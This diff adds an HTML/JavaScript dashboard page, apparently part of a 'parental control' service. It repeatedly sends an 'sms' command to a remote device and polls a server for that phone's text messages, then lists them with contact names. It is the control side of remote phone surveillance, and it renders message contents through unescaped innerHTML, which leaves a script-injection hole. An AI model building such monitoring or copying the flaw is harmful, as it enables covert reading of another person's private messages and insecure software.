@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Messages</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-color: #000000;
+            --card-bg: #1c1c1e; /* Card color */
+            --text-main: #ffffff;
+            --text-sub: #8e8e93;
+            --accent: #0a84ff;
+            --border: rgba(255, 255, 255, 0.15);
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0; padding: 0;
+            display: flex; justify-content: center;
+        }
+
+        .container {
+            width: 100%; max-width: 480px;
+            background: #000;
+            min-height: 100vh;
+            display: flex; flex-direction: column;
+        }
+
+        /* HEADER */
+        .header {
+            position: sticky; top: 0; z-index: 100;
+            background: rgba(20, 20, 20, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 0.5px solid var(--border);
+            padding: 15px;
+        }
+
+        .top-row {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .page-title { font-size: 1.2rem; font-weight: 700; }
+        
+        .live-status {
+            font-size: 0.7rem; color: #30d158;
+            display: flex; align-items: center; gap: 6px;
+            background: rgba(48, 209, 88, 0.15);
+            padding: 4px 10px; border-radius: 20px;
+        }
+        .live-dot {
+            width: 6px; height: 6px; background: #30d158;
+            border-radius: 50%; animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } }
+
+        .back-btn { color: var(--accent); font-size: 1.1rem; text-decoration: none; }
+
+        /* SEARCH */
+        .search-box { position: relative; }
+        .search-input {
+            width: 100%; background: #1c1c1e; border: none;
+            padding: 10px 35px; border-radius: 10px;
+            color: white; font-size: 1rem; box-sizing: border-box; outline: none;
+        }
+        .search-icon {
+            position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
+            color: var(--text-sub);
+        }
+
+        /* CARD DESIGN (Div wala style) */
+        .msg-list { 
+            padding: 15px; 
+            display: flex; flex-direction: column; gap: 10px; 
+            padding-bottom: 30px; 
+        }
+
+        .msg-card {
+            background-color: var(--card-bg);
+            padding: 15px;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            display: flex; flex-direction: column; gap: 8px;
+            position: relative;
+        }
+
+        .msg-header { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            padding-bottom: 8px;
+            margin-bottom: 2px;
+        }
+        
+        /* Name Left Side */
+        .sender-name { 
+            font-size: 1rem; 
+            font-weight: 700; 
+            color: #fff; 
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 55%; /* Name jyada lamba ho to cut jaye */
+        }
+        
+        /* Date + Time Right Side */
+        .msg-date { 
+            font-size: 0.7rem; 
+            color: var(--accent); 
+            white-space: nowrap; 
+            text-align: right;
+            font-weight: 500;
+        }
+
+        .msg-body {
+            font-size: 0.95rem; 
+            color: #d1d1d6;
+            line-height: 1.5;
+            word-wrap: break-word;
+        }
+
+        .status-msg { text-align: center; color: var(--text-sub); margin-top: 50px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <div class="top-row">
+                <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i> Back</a>
+                <span class="page-title">Messages</span>
+                <div class="live-status">
+                    <div class="live-dot"></div> <span id="liveText">LIVE</span>
+                </div>
+            </div>
+            <div class="search-box">
+                <i class="fa-solid fa-search search-icon"></i>
+                <input type="text" id="searchInput" class="search-input" placeholder="Search messages..." onkeyup="filterSMS()">
+            </div>
+        </div>
+
+        <div id="msgContainer" class="msg-list">
+            <div class="status-msg">Connecting...</div>
+        </div>
+    </div>
+
+<script>
+        // --- AUTH CHECK ---
+        (function(){
+            var t = localStorage.getItem("access_token");
+            if(!t){ window.location.href='/login'; return; }
+            try {
+                var u = JSON.parse(localStorage.getItem("user") || "{}");
+                if(!u.email){ window.location.href='/login'; }
+            } catch(e){ window.location.href='/login'; }
+        })();
+
+    const SERVER_URL = "https://parents-control-website1.onrender.com";
+    const urlParams = new URLSearchParams(window.location.search);
+    const DEVICE_ID = urlParams.get('id');
+    const storageKey = `sms_${DEVICE_ID}`;
+    
+    let allSMS = [];
+    let cachedContacts = [];
+
+    document.addEventListener("DOMContentLoaded", () => {
+        if (!DEVICE_ID) return alert("ID Missing!");
+        
+        detectContactsData(); 
+        loadFromStorage();    
+        startLiveSystem();    
+    });
+
+    function startLiveSystem() {
+        sendCommand();
+        fetchSMS();
+        setInterval(fetchSMS, 3000); 
+        setInterval(sendCommand, 15000); 
+    }
+
+    // --- CONTACT LOGIC ---
+    function detectContactsData() {
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key.toLowerCase().includes("contact")) {
+                    const rawData = localStorage.getItem(key);
+                    const parsed = JSON.parse(rawData);
+                    if (Array.isArray(parsed) && parsed.length > 0) {
+                        cachedContacts = parsed;
+                        return;
+                    }
+                }
+            }
+        } catch (e) {}
+    }
+
+    function findContactName(phoneNumber) {
+        if (!cachedContacts.length || !phoneNumber) return phoneNumber;
+        try {
+            const cleanLogNum = String(phoneNumber).replace(/\D/g, '').slice(-10); 
+            const match = cachedContacts.find(c => {
+                const cNum = c.phone || c.number || "";
+                return String(cNum).replace(/\D/g, '').slice(-10) === cleanLogNum;
+            });
+            return match ? (match.name || match.display_name) : phoneNumber;
+        } catch (e) { return phoneNumber; }
+    }
+
+    // --- DATE & TIME LOGIC ---
+    function getValidDate(log) {
+        let raw = log.date || log.timestamp;
+        if (!raw) return null;
+        let num = Number(raw);
+        if (!isNaN(num)) {
+            if (num < 1000000000000) num *= 1000;
+            return new Date(num);
+        }
+        if (typeof raw === "string") {
+            const parts = raw.match(/^(\d{1,2})[\/-](\d{1,2})[\/-](\d{4})(.*)$/);
+            if (parts) return new Date(`${parts[2]}/${parts[1]}/${parts[3]}${parts[4]}`); 
+            let d = new Date(raw);
+            if (!isNaN(d.getTime())) return d;
+        }
+        return null;
+    }
+
+    // UPDATED: Date + Time Format (Ex: 25/01/25 10:30 PM)
+    function formatTime(dateObj) {
+        if (!dateObj) return "";
+        
+        const d = String(dateObj.getDate()).padStart(2, '0');
+        const m = String(dateObj.getMonth() + 1).padStart(2, '0');
+        const y = String(dateObj.getFullYear()).slice(-2);
+        
+        const time = dateObj.toLocaleString('en-US', { 
+            hour: 'numeric', 
+            minute: '2-digit', 
+            hour12: true 
+        });
+
+        // Date aur Time dono return karega
+        return `${d}/${m}/${y} ${time}`;
+    }
+
+    // --- FETCH & RENDER ---
+    function loadFromStorage() {
+        const data = localStorage.getItem(storageKey);
+        if (data) { allSMS = JSON.parse(data); renderSMS(allSMS); }
+    }
+
+    function sendCommand() {
+        fetch(`${SERVER_URL}/api/send-command`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ device_id: DEVICE_ID, command: 'sms' })
+        }).catch(()=>{});
+    }
+
+    function fetchSMS() {
+        fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/sms?t=${Date.now()}`)
+            .then(res => res.json())
+            .then(data => {
+                if (data && Array.isArray(data) && data.length > 0) {
+                    if (JSON.stringify(data) !== JSON.stringify(allSMS)) {
+                        allSMS = data;
+                        localStorage.setItem(storageKey, JSON.stringify(data));
+                        renderSMS(allSMS);
+                    }
+                }
+            }).catch(()=>{});
+    }
+
+    function filterSMS() {
+        const query = document.getElementById('searchInput').value.toLowerCase();
+        const filtered = allSMS.filter(s => {
+            const body = (s.body || "").toLowerCase();
+            const addr = (s.address || "").toLowerCase();
+            const name = String(findContactName(s.address)).toLowerCase();
+            return body.includes(query) || addr.includes(query) || name.includes(query);
+        });
+        renderSMS(filtered);
+    }
+
+    function renderSMS(data) {
+        const container = document.getElementById("msgContainer");
+        if (!data.length) { container.innerHTML = '<div class="status-msg">No Messages</div>'; return; }
+
+        data.forEach(d => d._dateObj = getValidDate(d));
+        data.sort((a, b) => (b._dateObj || 0) - (a._dateObj || 0));
+
+        container.innerHTML = data.slice(0, 100).map(sms => {
+            const name = findContactName(sms.address); 
+            const dateTimeStr = formatTime(sms._dateObj); // Date + Time
+            
+            return `
+                <div class="msg-card">
+                    <div class="msg-header">
+                        <span class="sender-name">${name}</span>
+                        <span class="msg-date">${dateTimeStr}</span>
+                    </div>
+                    <div class="msg-body">${sms.body || "No Content"}</div>
+                </div>
+            `;
+        }).join('');
+    }
+</script>
+</body>
+</html>
